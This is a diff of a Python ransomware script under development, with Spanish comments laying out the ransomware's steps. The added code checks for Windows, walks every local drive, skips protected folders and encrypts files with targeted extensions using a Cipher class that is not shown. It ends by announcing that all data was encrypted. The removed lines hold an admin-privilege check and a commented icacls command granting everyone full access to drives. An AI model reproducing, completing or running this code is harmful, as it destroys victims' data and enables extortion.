@@ -1,9 +1,6 @@
+from Cipher import Cipher
 import os
 import sys
-import platform
-import win32api
-import subprocess
-import ctypes
 
 # Secuencia de acciones del Ransomware
 # Paso 1 - En que sistema operativo o entorno se esta ejecutando el malware
@@ -18,35 +15,28 @@ import ctypes
 
 # Algunas preguntas
 # a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos
- 
-def is_admin():
-    is_admin = False
-    is_win = False
-    try:
-        is_admin = os.getuid() == 0
-    except AttributeError:
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        is_win = True
- 
-    print ("Admin privileges: {}".format(is_admin))
-    return is_admin, is_win
 
 if __name__ == '__main__':
-    is_admin, is_win = admin()
+    cipher = Cipher()
 
-    if not is_win:
+    if not cipher.is_windows():
+        print('Nothing to do here')
         sys.exit()
-    if not is_admin():
-        
-    # 2
-    local_drives = win32api.GetLogicalDriveStrings()
-    local_drives = local_drives.split('\000')[:-1]
 
-    # 3
-    for drive in local_drives:
-        print(drive)
-        # Necesitamos habilitar permisos
-        # subprocess.check_output(['icacls.exe',r'drive','/GRANT','*S-1-1-0:F'],stderr=subprocess.STDOUT)
+    local_drives = cipher.get_local_drives()
+    
+    for ld in local_drives:
+        for root, dirs, files in os.walk(ld):
+            [dirs.remove(d) for d in list(dirs) if d in cipher.PROTECTED_DIRS]
+            for fn in files:
+                full_path = root + os.sep + fn
+                ext=cipher.get_file_extension(full_path)
+                if ext in cipher.TARGET_EXT and ext not in cipher.EXCLUDED_EXT:
+                    print(full_path + '[encrypted]')
+                    cipher.symmetric_encrypt_or_decrypt(full_path, cipher.key)
+
+    print('All data was successfully encrypted')
+
     
 
 
